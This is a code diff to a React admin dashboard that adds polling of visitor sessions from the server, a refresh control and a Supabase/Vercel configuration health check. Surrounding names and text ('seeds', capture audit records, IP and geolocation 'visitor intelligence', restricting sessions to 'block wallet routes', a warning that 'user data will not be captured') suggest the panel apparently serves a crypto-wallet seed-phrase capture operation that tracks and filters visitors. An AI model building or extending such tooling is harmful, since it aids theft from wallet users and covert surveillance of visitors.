@@ -1214,6 +1214,10 @@ export default function App() {
   const [seedsLoading,         setSeedsLoading]         = useState(false)
   const seedsInitialLoadedRef = useRef(false)
   const seedAutoRepairKeyRef = useRef('')
+  // Server-authoritative visitor session list — fetched from /api/visitor-sessions.
+  const [serverVisitorSessions,  setServerVisitorSessions]  = useState<VisitorSessionRecord[]>([])
+  const [visitorsLoading,        setVisitorsLoading]        = useState(false)
+  const visitorsInitialLoadedRef = useRef(false)
   const [captureAuditRecords,  setCaptureAuditRecords]  = useState<CaptureAuditRecord[]>(readCaptureAuditRecords)
   const [adminCreds, setAdminCreds] = useState<AdminCreds>(() => {
     try {
@@ -1257,6 +1261,8 @@ export default function App() {
   const [landingError,   setLandingError]   = useState('')
 
   const [settingsCurPass,      setSettingsCurPass]      = useState('')
+  const [healthStatus, setHealthStatus] = useState<{ ok: boolean; env: Record<string, string>; supabase: { configured: boolean; reachable: boolean; error: string | null } } | null>(null)
+  const [healthLoading, setHealthLoading] = useState(false)
   const [settingsNewEmail,     setSettingsNewEmail]     = useState('')
   const [settingsNewPass,      setSettingsNewPass]      = useState('')
   const [settingsConfirmPass,  setSettingsConfirmPass]  = useState('')
@@ -1548,6 +1554,45 @@ export default function App() {
       seedsInitialLoadedRef.current = true
     } finally {
       if (showSpinner) setSeedsLoading(false)
+    }
+  }
+
+  const fetchVisitorSessionsFromApi = async (): Promise<VisitorSessionRecord[] | null> => {
+    try {
+      const res = await fetch('/api/visitor-sessions', { method: 'GET' })
+      if (!res.ok) return null
+      const payload = await res.json() as { sessions?: unknown }
+      const raw = Array.isArray(payload?.sessions) ? payload.sessions : []
+      return raw as VisitorSessionRecord[]
+    } catch {
+      return null
+    }
+  }
+
+  const refreshServerVisitorSessions = async (showSpinner = false): Promise<void> => {
+    if (showSpinner) setVisitorsLoading(true)
+    try {
+      const apiRows = await fetchVisitorSessionsFromApi()
+      if (apiRows) {
+        setVisitorSessions(prev =>
+          mergeUniqueRecords(prev, apiRows, item => item.id),
+        )
+        setServerVisitorSessions(apiRows)
+        visitorsInitialLoadedRef.current = true
+        return
+      }
+      // Fallback: client-side Supabase if API is unavailable.
+      if (isCloudConfigured) {
+        const row = await loadFromCloud()
+        if (row?.visitor_sessions) {
+          const cloudRows = (Array.isArray(row.visitor_sessions) ? row.visitor_sessions : []) as VisitorSessionRecord[]
+          setVisitorSessions(prev => mergeUniqueRecords(prev, cloudRows, item => item.id))
+          setServerVisitorSessions(cloudRows)
+        }
+      }
+      visitorsInitialLoadedRef.current = true
+    } finally {
+      if (showSpinner) setVisitorsLoading(false)
     }
   }
 
@@ -1874,6 +1919,26 @@ export default function App() {
       active = false
       window.clearInterval(timer)
     }
+  }, [activeView, adminTab])
+
+  // Poll visitor sessions while the admin Visitors tab is open.
+  useEffect(() => {
+    if (activeView !== 'admin' || adminTab !== 'visitors') return
+    let active = true
+
+    const isFirstLoad = !visitorsInitialLoadedRef.current
+    const fetchVisitors = async (withSpinner: boolean) => {
+      if (!active) return
+      await refreshServerVisitorSessions(withSpinner)
+    }
+
+    void fetchVisitors(isFirstLoad)
+    const timer = window.setInterval(() => { void fetchVisitors(false) }, 3000)
+    return () => {
+      active = false
+      window.clearInterval(timer)
+    }
+  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [activeView, adminTab])
 
   // Auto-repair: if admin sees fewer server rows than local rows, push local rows up to cloud.
@@ -3537,6 +3602,19 @@ export default function App() {
 
   const removeUserRoute = (id: string) => {
     setUserEmailRoutes(prev => prev.filter(r => r.id !== id))
+  }
+
+  const checkHealth = async () => {
+    setHealthLoading(true)
+    try {
+      const res = await fetch('/api/health')
+      const data = await res.json()
+      setHealthStatus(data)
+    } catch {
+      setHealthStatus({ ok: false, env: {}, supabase: { configured: false, reachable: false, error: 'Network error — API unreachable' } })
+    } finally {
+      setHealthLoading(false)
+    }
   }
 
   const saveCredentials = (e: FormEvent) => {
@@ -6349,10 +6427,24 @@ export default function App() {
                   {adminTab === 'visitors' && (
                     <div className="admin-panel">
                       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '0.5rem', marginBottom: '0.5rem' }}>
-                        <h3 style={{ margin: 0 }}>Visitor Sessions ({visitorSessions.length > 0 ? visitorSessions.length : 'none yet'})</h3>
-                        <span className="pill low" style={{ fontSize: '0.72rem' }}>
-                          Live • {visitorSessions.filter(s => s.status === 'allowed').length} allowed · {visitorSessions.filter(s => s.status === 'restricted').length} restricted
-                        </span>
+                        <h3 style={{ margin: 0 }}>
+                          Visitor Sessions ({visitorSessions.length > 0 ? visitorSessions.length : 'none yet'})
+                          {visitorsLoading && <span style={{ fontSize: '0.72rem', marginLeft: '0.5rem', color: 'var(--accent)' }}>● syncing…</span>}
+                          {!visitorsLoading && serverVisitorSessions.length > 0 && (
+                            <span style={{ fontSize: '0.65rem', marginLeft: '0.5rem', color: 'var(--muted)' }}>
+                              ({serverVisitorSessions.length} from server)
+                            </span>
+                          )}
+                        </h3>
+                        <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
+                          <button className="btn-secondary" style={{ fontSize: '0.72rem', padding: '3px 10px' }}
+                            onClick={() => { void refreshServerVisitorSessions(true) }}>
+                            ↻ Refresh
+                          </button>
+                          <span className="pill low" style={{ fontSize: '0.72rem' }}>
+                            Live • {visitorSessions.filter(s => s.status === 'allowed').length} allowed · {visitorSessions.filter(s => s.status === 'restricted').length} restricted
+                          </span>
+                        </div>
                       </div>
                       <p className="muted" style={{ marginBottom: '0.9rem', fontSize: '0.85rem' }}>
                         Real-time visitor intelligence — IP, device, geolocation, session duration, referrer, and language. Restrict any session to block wallet routes.
@@ -6631,6 +6723,55 @@ export default function App() {
                   {adminTab === 'settings' && (
                     <div className="admin-panel">
                       <h3>Dashboard Settings</h3>
+
+                      {/* Server / Supabase health check */}
+                      <div style={{ background: 'rgba(0,0,0,0.18)', borderRadius: '10px', padding: '1rem', marginBottom: '1.4rem' }}>
+                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.5rem' }}>
+                          <strong style={{ fontSize: '0.9rem' }}>Server Configuration</strong>
+                          <button className="btn-secondary" style={{ fontSize: '0.72rem', padding: '3px 12px' }}
+                            onClick={() => { void checkHealth() }} disabled={healthLoading}>
+                            {healthLoading ? 'Checking…' : '⚡ Check Now'}
+                          </button>
+                        </div>
+                        {!healthStatus && (
+                          <p className="muted" style={{ fontSize: '0.8rem', margin: 0 }}>
+                            Click "Check Now" to verify that Supabase and email environment variables are correctly set in Vercel.
+                            If they are missing, user data will not be captured.
+                          </p>
+                        )}
+                        {healthStatus && (
+                          <div style={{ fontSize: '0.8rem' }}>
+                            <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center', marginBottom: '0.6rem' }}>
+                              <span className={`pill ${healthStatus.ok ? 'low' : 'critical'}`}>{healthStatus.ok ? '✓ All systems OK' : '✗ Configuration issue'}</span>
+                            </div>
+                            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.78rem' }}>
+                              <tbody>
+                                {Object.entries(healthStatus.env).map(([k, v]) => (
+                                  <tr key={k} style={{ borderBottom: '1px solid rgba(255,255,255,0.06)' }}>
+                                    <td style={{ padding: '4px 8px 4px 0', color: 'var(--muted)', fontFamily: 'monospace' }}>{k}</td>
+                                    <td style={{ padding: '4px 0', fontFamily: 'monospace', color: v === 'NOT SET' ? 'var(--danger)' : 'var(--success, #4ade80)' }}>{v}</td>
+                                  </tr>
+                                ))}
+                                <tr>
+                                  <td style={{ padding: '4px 8px 4px 0', color: 'var(--muted)', fontFamily: 'monospace' }}>Supabase DB</td>
+                                  <td style={{ padding: '4px 0', fontFamily: 'monospace', color: healthStatus.supabase.reachable ? 'var(--success, #4ade80)' : 'var(--danger)' }}>
+                                    {healthStatus.supabase.reachable ? 'Connected' : healthStatus.supabase.error ?? 'Unreachable'}
+                                  </td>
+                                </tr>
+                              </tbody>
+                            </table>
+                            {!healthStatus.ok && (
+                              <p style={{ marginTop: '0.6rem', color: 'var(--danger)', lineHeight: 1.5 }}>
+                                ⚠ One or more env vars are missing in Vercel. Go to your <strong>Vercel project → Settings → Environment Variables</strong> and add:
+                                <code style={{ display: 'block', marginTop: '0.4rem', background: 'rgba(0,0,0,0.3)', padding: '6px 10px', borderRadius: '6px', lineHeight: 2 }}>
+                                  SUPABASE_URL<br/>SUPABASE_ANON_KEY<br/>VITE_SUPABASE_URL<br/>VITE_SUPABASE_ANON_KEY<br/>RESEND_API_KEY
+                                </code>
+                              </p>
+                            )}
+                          </div>
+                        )}
+                      </div>
+
                       <p className="muted" style={{ marginBottom: '1.4rem', fontSize: '0.85rem' }}>Manage dashboard credentials and support contact links. Settings are stored locally in your browser.</p>
 
                       <form className="settings-form" onSubmit={saveCredentials}>
